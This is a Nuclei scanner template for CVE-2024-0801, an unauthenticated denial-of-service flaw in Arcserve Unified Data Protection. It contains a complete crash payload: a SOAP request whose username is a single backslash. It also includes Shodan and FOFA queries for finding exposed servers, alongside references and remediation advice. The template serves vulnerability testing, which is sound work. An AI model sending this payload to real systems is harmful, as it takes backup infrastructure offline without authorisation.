templates/CVE-2024-0801.yaml

flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(content_type, "text/xml")
    - contains(body, "Invalid user credentials")
    internal: true
    type: dsl
  raw:
  - 'POST /management/services/EdgeServiceConsoleImpl HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml


    <?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:validateUserByUser
    xmlns:ns2="http://webservice.edge.arcserve.ca.com/"><arg0>{{user}}</arg0><arg1>{{pass}}</arg1><arg2>domain</arg2></ns2:validateUserByUser></S:Body></S:Envelope>

    '
- matchers:
  - condition: or
    dsl:
    - status_code == 503 && contains(body, "<h1>Service Unavailable</h1>")
    - status_code == 502 && contains(body, "<h1>Proxy Error</h1>")
    type: dsl
  raw:
  - 'POST /management/services/EdgeServiceConsoleImpl HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml


    <?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:validateUserByUser
    xmlns:ns2="http://webservice.edge.arcserve.ca.com/"><arg0>\</arg0><arg1>{{pass}}</arg1><arg2>domain</arg2></ns2:validateUserByUser></S:Body></S:Envelope>

    '
id: CVE-2024-0801
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:arcserve:udp:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-0801
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-75
    epss-percentile: 0.98307
    epss-score: 0.63138
  description: 'A denial of service vulnerability exists in Arcserve Unified Data
    Protection 9.2 and 8.1 in ASNative.dll.

    '
  impact: 'Attackers can cause system crashes or unavailability, leading to service
    disruption and potential downtime.

    '
  metadata:
    fofa-query: icon_hash="1015186617"
    max-request: 2
    product: udp
    shodan-query: http.favicon.hash:1015186617
    vendor: arcserve
    verified: true
  name: Arcserve Unified Data Protection - Unauthenticated DoS in ASNative.dll
  reference:
  - https://www.tenable.com/security/research/tra-2024-07
  - https://nvd.nist.gov/vuln/detail/CVE-2024-0801
  remediation: 'Update to the latest version of Arcserve Unified Data Protection or
    apply available patches.

    '
  severity: high
  tags: cve,cve2024,arcserve,dos,intrusive,vkev
variables:
  pass: '{{to_lower(rand_base(6))}}'
  user: '{{to_lower(rand_base(6))}}'
